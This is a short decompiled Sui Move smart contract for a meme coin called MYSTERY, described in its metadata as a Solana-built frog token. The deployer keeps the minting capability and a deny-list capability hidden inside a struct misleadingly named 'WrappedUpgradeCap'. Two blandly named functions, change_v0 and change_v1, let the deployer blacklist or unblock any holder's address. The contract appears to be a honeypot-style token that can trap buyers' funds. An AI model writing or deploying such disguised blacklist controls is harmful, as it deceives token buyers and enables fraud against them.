module 0x36b3a917b538adfdf44b8abc6aa6821a0973840dbc4903f5692cd4c0f4414081::mystery {
    struct MYSTERY has drop {
        dummy_field: bool,
    }

    struct WrappedUpgradeCap has store, key {
        id: 0x2::object::UID,
        denyCap: 0x2::coin::DenyCapV2<MYSTERY>,
    }

    public fun change_v0(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut WrappedUpgradeCap, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MYSTERY>(arg0, &mut arg1.denyCap, arg2, arg3);
    }

    public fun change_v1(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut WrappedUpgradeCap, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MYSTERY>(arg0, &mut arg1.denyCap, arg2, arg3);
    }

    fun init(arg0: MYSTERY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MYSTERY>(arg0, 6, b"MYSTERY", b"The Night Riders", b"Mystery is a, Solana-built meme token representing the frog from Matt Furie's first published book, 'The Night Riders'.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://pump.mypinata.cloud/ipfs/QmRnfqN6dQP2Xo4jKYiAoWeVe9rd6Uo2dpRjRwqRQ8uTtN?img-width=256&img-dpr=2&img-onerror=redirect"))), false, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MYSTERY>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<MYSTERY>>(v0, 0x2::tx_context::sender(arg1));
        let v3 = WrappedUpgradeCap{
            id      : 0x2::object::new(arg1),
            denyCap : v1,
        };
        0x2::transfer::public_transfer<WrappedUpgradeCap>(v3, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

